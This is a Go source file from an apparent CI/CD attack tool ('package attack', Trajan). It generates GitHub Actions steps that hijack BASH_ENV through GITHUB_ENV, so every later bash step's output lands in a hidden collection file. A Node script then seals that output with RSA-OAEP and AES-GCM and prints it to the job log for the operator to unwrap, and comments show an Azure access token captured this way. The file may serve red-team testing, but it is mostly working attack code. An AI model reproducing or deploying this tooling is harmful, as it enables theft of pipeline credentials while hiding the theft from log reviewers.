package attack

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"encoding/pem"
	"errors"
	"fmt"
	"strings"
)

// The rsa-oaep-hybrid seal. A composed workflow that sets encryption: collects
// its marker stream on the runner and prints, in place of plaintext, one envelope
// the harvest unwraps in memory:
//
//	trajan-marker=<seal>
//	trajan-enc=rsa-oaep-hybrid
//	trajan-wrapped-key=<base64( RSA-OAEP-SHA256( sym ) )>
//	trajan-ciphertext=<base64( nonce(12) || AES-256-GCM(sym, nonce, stream) || tag(16) )>
//	trajan-marker-end=<seal>
//
// sym is a fresh 256-bit key; RSA-OAEP-SHA256 wraps it under the run's public
// half; AES-256-GCM seals the stream under sym with a 12-byte nonce, and Go's
// gcm.Open consumes ciphertext||tag, which is exactly the blob past the nonce.
// Node is the toolchain: crypto.publicEncrypt with RSA_PKCS1_OAEP_PADDING +
// oaepHash sha256, and createCipheriv('aes-256-gcm', ...). A runner that resolves
// no interpreter exits non-zero with trajan-error=crypto-toolchain-unavailable
// rather than printing the stream in plaintext.
//
// PATH is not the whole answer to whether a runner has Node. Every runner release
// bundles one under <runner>/externals, because the Actions runner cannot execute a
// JavaScript action without it, but that copy is invoked by the runner directly and
// is not on the PATH a run: step inherits — so a self-hosted host with no
// system-wide install fails a PATH-only check while holding a usable interpreter.
// Measured on the firing range: vm-trajan-devops answered
// crypto-toolchain-unavailable to `command -v node`. The bundled path is derived
// from RUNNER_TEMP rather than read from a variable of its own because the runner
// publishes none, and the tool cache is searched too so a host that has run
// actions/setup-node before is served by what that already left behind.
const runKeyBits = 2048

// errNoRunKey is the resume-across-processes case: the private half lives only in
// the process that minted it, so a run resumed in a new process holds none.
var errNoRunKey = errors.New("this process holds no run key")

func mintRunKey() (*rsa.PrivateKey, error) {
	return rsa.GenerateKey(rand.Reader, runKeyBits)
}

func publicKeyPEM(key *rsa.PrivateKey) (string, error) {
	if key == nil {
		return "", nil
	}
	der, err := x509.MarshalPKIXPublicKey(&key.PublicKey)
	if err != nil {
		return "", err
	}
	return string(pem.EncodeToMemory(&pem.Block{Type: "PUBLIC KEY", Bytes: der})), nil
}

// unwrapSeal reverses one envelope. Every failure mode is a returned error rather
// than a partial read: a truncated wrapped key fails the OAEP unwrap, a corrupted
// ciphertext fails the GCM tag, and a run resumed in a new process fails at the
// missing key — none of them yield bytes that could be mistaken for evidence.
func (s *Session) unwrapSeal(wrappedB64, blobB64 string) ([]byte, error) {
	if s.privateKey == nil {
		return nil, errNoRunKey
	}
	wrapped, err := base64.StdEncoding.DecodeString(strings.TrimSpace(wrappedB64))
	if err != nil {
		return nil, fmt.Errorf("wrapped key is not base64: %w", err)
	}
	blob, err := base64.StdEncoding.DecodeString(strings.TrimSpace(blobB64))
	if err != nil {
		return nil, fmt.Errorf("ciphertext is not base64: %w", err)
	}
	sym, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, s.privateKey, wrapped, nil)
	if err != nil {
		return nil, fmt.Errorf("unwrapping the symmetric key failed: %w", err)
	}
	if len(sym) != 32 {
		return nil, fmt.Errorf("unwrapped key is %d bytes, expected 32", len(sym))
	}
	block, err := aes.NewCipher(sym)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	if len(blob) < gcm.NonceSize() {
		return nil, fmt.Errorf("sealed stream is %d bytes, shorter than the %d-byte nonce", len(blob), gcm.NonceSize())
	}
	nonce, ct := blob[:gcm.NonceSize()], blob[gcm.NonceSize():]
	plain, err := gcm.Open(nil, nonce, ct, nil)
	if err != nil {
		return nil, fmt.Errorf("GCM authentication failed: %w", err)
	}
	return plain, nil
}

func randMarker() string {
	var b [8]byte
	if _, err := rand.Read(b[:]); err != nil {
		return "trajan-seal"
	}
	return "trajan-seal-" + hex.EncodeToString(b[:])
}

// sealJS is written to the runner by the setup step and run by the seal step. It
// reads the pubkey PEM and the collected stream by path, seals, and prints the
// envelope's three interior lines to the log.
const sealJS = `const fs = require('fs');
const crypto = require('crypto');
const pub = fs.readFileSync(process.argv[2], 'utf8');
const data = fs.readFileSync(process.argv[3]);
const key = crypto.randomBytes(32);
const iv = crypto.randomBytes(12);
const c = crypto.createCipheriv('aes-256-gcm', key, iv);
const ct = Buffer.concat([c.update(data), c.final()]);
const tag = c.getAuthTag();
const blob = Buffer.concat([iv, ct, tag]);
const wrapped = crypto.publicEncrypt({key: pub, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING, oaepHash: 'sha256'}, key);
process.stdout.write('trajan-enc=rsa-oaep-hybrid\n');
process.stdout.write('trajan-wrapped-key=' + wrapped.toString('base64') + '\n');
process.stdout.write('trajan-ciphertext=' + blob.toString('base64') + '\n');
`

// sealSteps returns the setup and seal steps that bracket a composed job when
// encryption is on. The setup step confirms node before anything runs and, on a
// runner without it, fails loud rather than letting the fragments print
// plaintext. It then redirects every subsequent bash step's output into a
// collection file via BASH_ENV — the corpus workflow fragments all set
// shell: bash, which overrides a job default but still sources BASH_ENV — so the
// markers land in the file, not the world-readable log, which retains only the
// steps' own (value-free) source echo. The seal step exempts itself with
// TRAJAN_SEALING and prints the envelope.
//
// The redirect script unsets BASH_ENV as its first act, and that line is what makes
// the mechanism correct rather than merely quiet. Bash sources BASH_ENV on every
// non-interactive startup, so without the unset it reaches not just the step's shell
// but every bash script the step invokes — and the redirect then replaces that
// child's stdout, which inside $(...) is the pipe the caller is reading. The child's
// output lands in the collection file and the caller captures the empty string.
// Measured on the firing range: `az` ships as a bash wrapper, so a step reading
// `tok=$(az account get-access-token ...)` saw nothing and reported its own negative
// while the token sat in the evidence one line above — the mechanism manufacturing
// exactly the false negative a Measurement is shaped to make impossible. Binaries
// were unaffected, which is why curl in the same step worked and made the failure
// look like a property of the tool rather than of the collection.
func sealSteps(pubPEM string) (setup, seal string) {
	marker := randMarker()
	pub := base64.StdEncoding.EncodeToString([]byte(pubPEM))
	js := base64.StdEncoding.EncodeToString([]byte(sealJS))

	setup = fmt.Sprintf(`- name: trajan-seal-setup
  env:
    TRAJAN_SEALING: '1'
  shell: bash
  run: |
    set -eu
    m=%[1]s
    node_bin=$(command -v node 2>/dev/null || true)
    if [ -z "$node_bin" ]; then
      for c in "${RUNNER_TEMP%%/_work/_temp}"/externals/node*/bin/node "${RUNNER_TOOL_CACHE:-}"/node/*/*/bin/node; do
        if [ -x "$c" ]; then node_bin=$c; break; fi
      done
    fi
    [ -n "$node_bin" ] || { echo "trajan-marker=$m"; echo trajan-error=crypto-toolchain-unavailable; echo "trajan-marker-end=$m"; exit 1; }
    printf '%%s' "$node_bin" > "${RUNNER_TEMP}/trajan-node"
    printf '%%s' '%[2]s' | base64 -d > "${RUNNER_TEMP}/trajan-pub.pem"
    printf '%%s' '%[3]s' | base64 -d > "${RUNNER_TEMP}/trajan-seal.js"
    : > "${RUNNER_TEMP}/trajan-collect"
    printf '%%s\n' 'unset BASH_ENV' '[ -n "${TRAJAN_SEALING:-}" ] || exec >> "'"${RUNNER_TEMP}"'/trajan-collect" 2>&1' > "${RUNNER_TEMP}/trajan-redirect.sh"
    echo "BASH_ENV=${RUNNER_TEMP}/trajan-redirect.sh" >> "$GITHUB_ENV"`, marker, pub, js)

	seal = fmt.Sprintf(`- name: trajan-seal
  if: always()
  env:
    TRAJAN_SEALING: '1'
  shell: bash
  run: |
    set -u
    m=%[1]s
    echo "trajan-marker=$m"
    node_bin=$(cat "${RUNNER_TEMP}/trajan-node" 2>/dev/null || true)
    { [ -n "$node_bin" ] && [ -x "$node_bin" ]; } || { echo trajan-error=crypto-toolchain-unavailable; echo "trajan-marker-end=$m"; exit 1; }
    collect="${RUNNER_TEMP}/trajan-collect"
    if [ ! -s "$collect" ]; then echo trajan-error=nothing-collected; echo "trajan-marker-end=$m"; exit 1; fi
    "$node_bin" "${RUNNER_TEMP}/trajan-seal.js" "${RUNNER_TEMP}/trajan-pub.pem" "$collect" || { echo trajan-error=seal-failed; echo "trajan-marker-end=$m"; exit 1; }
    echo "trajan-marker-end=$m"`, marker)

	return setup, seal
}
